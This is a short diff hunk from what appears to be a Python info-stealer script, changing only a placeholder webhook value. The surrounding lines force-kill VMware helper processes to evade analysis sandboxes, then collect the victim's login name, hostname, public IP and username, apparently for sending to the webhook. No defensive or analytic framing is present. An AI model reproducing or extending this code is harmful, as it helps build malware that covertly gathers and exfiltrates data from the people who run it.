@@ -27,7 +27,7 @@ os.system("taskkill /f /im  vmacthlp.exe")
 os.system("taskkill /f /im  vmtoolsd.exe")
 os.system('cls')
 u = os.getlogin()
-webhook = "Enter Dual Webhook Here"
+webhook = "Webhookss"
 hostname = socket.gethostname()  
 ips = requests.get('https://api.ipify.org').text 
 pc_username = os.getenv("UserName")
